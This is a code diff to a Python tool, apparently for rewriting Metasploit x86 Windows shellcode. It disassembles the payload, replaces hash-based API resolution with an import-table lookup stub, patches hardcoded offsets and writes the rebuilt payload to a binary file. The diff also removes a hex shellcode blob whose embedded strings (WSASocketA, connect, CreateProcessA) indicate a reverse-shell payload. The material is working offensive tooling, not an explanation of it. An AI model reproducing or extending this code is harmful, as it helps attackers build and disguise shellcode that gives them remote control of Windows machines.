@@ -221,6 +221,14 @@ class x86_windows_metasploit:
         print("Platform: %s" % self.comment)
         #print("self.Code: %s" % self.code)
         
+    def fix_up_hardcoded_offsets(self):
+        for key, value in self.tracker_dict.items():
+            if value['ebp_offset_update'] and value['bytes'] == b'\x8d\x85\xb2\x00\x00\x00':
+                offset_to_cmd = struct.pack("<I", len(self.jump_stub) + len(self.IAT_payload) + len(self.stub) + 48 - 5)
+                print("InHardCodedFixUp", key, value, offset_to_cmd)
+                offset_to_cmd = b'\x8d\x85' + offset_to_cmd
+                self.prestine_code = re.sub(b'\x8d\x85\xb2\x00\x00\x00', offset_to_cmd, self.prestine_code)
+
     def block_tracker(self):
         '''
         This is really for finding APIs....
@@ -280,6 +288,8 @@ class x86_windows_metasploit:
                         print(value['mnemonic'], "+", value['op_str'])
                         if len(value['bytes']) > 2:
                             ebx = hex(struct.unpack("<I", value['bytes'][1:])[0])
+                        called_api = self.get_hash(ebx)
+
                         #print(hex(struct.unpack("<I", asm[1:])[0]))
 
                     elif value['mnemonic'] == 'push' and len(value['bytes']) > 1: # push
@@ -328,7 +338,8 @@ class x86_windows_metasploit:
         Enumerate APIs via disasm
         Build lookup table
         Put it together.
-
+        # win/exec if I see lea eax, ebp + X then I know metasploit has hardcoded the payload
+        to account for the site of the hash API call.  I can mark this address then fix up after everything is built.
         '''
         print("Disasm:")
         print("*" * 16)
@@ -363,6 +374,7 @@ class x86_windows_metasploit:
                        'op_str': insn.op_str,
                        'controlFlowTag': None,
                        'blocktag': blocktag,
+                       'ebp_offset_update': False,   # True /False
                        }
                 
                 #if insn.mnemonic == 'int3':
@@ -421,9 +433,14 @@ class x86_windows_metasploit:
                     print('another jump, just assigning cft')
                     self.tracker_dict[insn.address]['controlFlowTag'] = ''.join(random.choice("klmnopqrstuvxyzHIJKLMNOPQRSTUV89") for _ in range(8))
                 
+                if '[ebp' in insn.op_str:
+                    print("Found a hardcoded offset for Stephen Fewers hash API reference")
+                    self.tracker_dict[insn.address]['ebp_offset_update'] = True
+
                 if blocktag not in self.block_order:
                     self.block_order.append(blocktag)
-                    
+                
+
         except Exception as e:
             print("ERROR: %s" % e)
             sys.exit(-1)
@@ -483,16 +500,12 @@ class x86_windows_metasploit:
             self.lookup_table = self.lookup_table[:m.start()+4] + struct.pack("B", d.start() - m.start()-4) + struct.pack("B", a.start() - m.start()-5) + self.lookup_table[m.start()+6:]
         
 
-        #print("Updated table", binascii.hexlify(self.lookup_table), len(self.lookup_table))
+        print("Updated table", binascii.hexlify(self.lookup_table), len(self.lookup_table))
         self.stub = b''
         ## TODO: ADD STUB HERE:
 
-        if len(self.lookup_table) < 256/2:
-            self.stub += b'\xeb'
-            self.stub += struct.pack("<B", len(self.lookup_table))
-        else:
-            self.stub += b"\xe9"
-            self.stub += struct.pack("<I", len(self.lookup_table))
+        self.stub += b"\xe9"
+        self.stub += struct.pack("<I", len(self.lookup_table))
         
         self.stub += self.lookup_table
         table_offset = len(self.stub) - len(self.lookup_table)
@@ -562,40 +575,20 @@ class x86_windows_metasploit:
         self.stub += struct.pack("<I", len(self.IAT_payload)+ len(self.stub) -3)  #\xB9\x01\x00\x00"      #SUB EBP,1B9
         self.stub += b"\xC3"               # RETN
 
-#8B D0 33 C0 8B 8E 15 FF FF FF 8A C1 8B CE 03 C8 81 E9 EB 00 00 00 51 52 8B 4C 24 1C
-
-
-
-        working_code = '''
-
-        E8 30 02 00 00 FC 60 8B EC FC 31 D2 64 8B 52 30 8B 52 08 8B DA 03 52 3C 8B BA 80 00 00 00 03 FB
-        8B 57 0C 03 D3 81 3A 4B 45 52 4E 74 05 83 C7 14 EB EE 57 EB 3E 8B 57 10 03 D3 8B 37 03 F3 8B CA
-        81 C1 00 00 FF 00 33 ED 8B 06 03 C3 83 C0 02 3B C8 72 18 3B C2 72 14 3E 8B 7C 24 04 39 38 75 0B
-        3E 8B 7C 24 08 39 78 08 75 01 C3 83 C5 04 83 C6 04 EB D5 68 61 72 79 41 68 4C 6F 61 64 E8 B3 FF
-        FF FF 03 D5 83 C4 08 5F 52 68 64 64 72 65 68 47 65 74 50 E8 9D FF FF FF 03 D5 5D 5D 5B 8B EA FC
-        90 E9 C7 00 00 00 F0 B5 A2 56 85 35 79 CC 3F 86 7F 8E A6 95 BD 9D 79 97 99 A5 74 61 7C 2F 08 87
-        1D 60 6D 96 29 80 6B 00 70 5B EA 0F DF E0 6A 3D 47 13 72 6F 20 25 4C 77 26 07 55 3C 00 00 00 00
-        45 78 69 74 50 72 6F 63 65 73 73 00 63 6F 6E 6E 65 63 74 00 6E 74 64 6C 6C 00 52 74 6C 45 78 69
-        74 55 73 65 72 54 68 72 65 61 64 00 57 53 41 53 6F 63 6B 65 74 41 00 4C 6F 61 64 4C 69 62 72 61
-        72 79 41 00 57 53 41 53 74 61 72 74 75 70 00 6B 65 72 6E 65 6C 33 32 00 77 73 32 5F 33 32 00 43
-        72 65 61 74 65 50 72 6F 63 65 73 73 41 00 47 65 74 56 65 72 73 69 6F 6E 00 57 61 69 74 46 6F 72
-        53 69 6E 67 6C 65 4F 62 6A 65 63 74 00 90 90 90 90 90 90 90 90 90 33 C0 BE 4C 77 26 07 3B 74 24
-        24 74 0B BE 49 F7 02 78 3B 74 24 24 75 02 61 C3 E8 00 00 00 00 5E 8B 8E 11 FF FF FF 3B 4C 24 24
-        74 05 83 C6 06 EB EF 8B 8E 15 FF FF FF 8A C1 8B CE 03 C8 81 E9 EB 00 00 00 51 90 90 90 90 FF 13
-        8B D0 33 C0 8B 8E 15 FF FF FF 8A C5 8B CE 03 C8 81 E9 EA 00 00 00 51 52 90 90 90 90 FF 55 00 61
-        8B 44 24 B8 5E 59 FF D0 56 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
-        90 90 90 90 90 90 90 90 90
-        '''
 
         self.jump_stub = b"\xe8"
         self.jump_stub += struct.pack("<I", len(self.IAT_payload) + len(self.stub))
+        
+        #look for ebp_offset_update here and update
+
+        self.fix_up_hardcoded_offsets()
+
         self.entire_payload = self.jump_stub + self.IAT_payload + self.stub + self.prestine_code
 
-        #TODO: Now start building shellcode
-        #self.shellcode += self.lookup_table
         
         print("Output payload:", binascii.hexlify(self.entire_payload), len(self.entire_payload))
-        
+        with open('testing-out.bin', 'wb') as f:
+            f.write(self.entire_payload)
         print("EXIT")
         
         sys.exit()
